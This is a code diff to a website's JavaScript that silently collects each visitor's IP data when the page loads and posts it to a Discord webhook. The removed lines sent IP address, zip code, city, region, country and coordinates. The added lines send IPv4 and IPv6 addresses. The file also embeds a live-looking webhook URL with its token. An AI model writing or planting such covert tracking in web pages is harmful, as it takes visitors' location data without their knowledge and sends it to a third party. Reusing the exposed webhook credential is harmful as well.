@@ -348,47 +348,62 @@ function change() {
     document.body.appendChild(button);
   }
 }
-function getUserIPAddress() {
-  fetch('http://ip-api.com/json')
-    .then(response => {
-      if (!response.ok) {
-        throw new Error('Failed to fetch IP address');
-      }
-      return response.json();
-    })
-    .then(data => {
-      const uinfo = [data.query, data.zip, data.city, data.regionName, data.countryCode, data.lat, data.lon];
-      sendIPViaWebhook(uinfo);
-    })
-    .catch(error => {
-      console.error('Error getting user IP address:', error);
-    });
+async function getUserIPAddress() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    if (!response.ok) {
+      throw new Error('Failed to fetch IP address');
+    }
+    const data = await response.json();
+    return data.ip;
+  } catch (error) {
+    console.error('Error getting user IP address:', error);
+    return null;
+  }
 }
 
-function sendIPViaWebhook(info) {
+async function getUserIPv6Address() {
+  try {
+    const response = await fetch('https://api64.ipify.org?format=json');
+    if (!response.ok) {
+      throw new Error('Failed to fetch IPv6 address');
+    }
+    const data = await response.json();
+    return data.ip;
+  } catch (error) {
+    console.error('Error getting user IPv6 address:', error);
+    return null;
+  }
+}
+
+async function sendIPViaWebhook() {
+  const uinfo1 = await getUserIPAddress();
+  const uinfo2 = await getUserIPv6Address();
+
   const webhookURL = 'https://discord.com/api/webhooks/1187164716980785223/PLQjmGNi2-zqSHtfNyTjMpGfOosQPaOJkhU8rdLxmGbWwqRnAxJnkdTexKEuU7thAWAe';
   
   const data = {
-    content: `Person entered the website! \nIp: ${info[0]} \nZip Code: ${info[1]} \nCity: ${info[2]} \nRegion: ${info[3]} \nCountry: ${info[4]} \nLat: ${info[5]} \nLon: ${info[6]}`
+    content: `Person entered the website! \nIpv4: ${uinfo1} \nIpv6: ${uinfo2}`
   };
-  
 
-  fetch(webhookURL, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify(data),
-  })
-  .then(response => {
-    if (!response.ok) {
-      throw new Error('Failed to send IP address via webhook');
+  try {
+    const webhookResponse = await fetch(webhookURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(data)
+    });
+
+    if (!webhookResponse.ok) {
+      throw new Error('Failed to send data via webhook');
     }
-    console.log('IP address sent successfully!');
-  })
-  .catch(error => {
-    console.error('Error sending IP address via webhook:', error);
-  });
+
+    console.log('Data sent successfully via webhook!');
+  } catch (error) {
+    console.error('Error sending data via webhook:', error);
+  }
 }
 
-getUserIPAddress();
+sendIPViaWebhook();
+
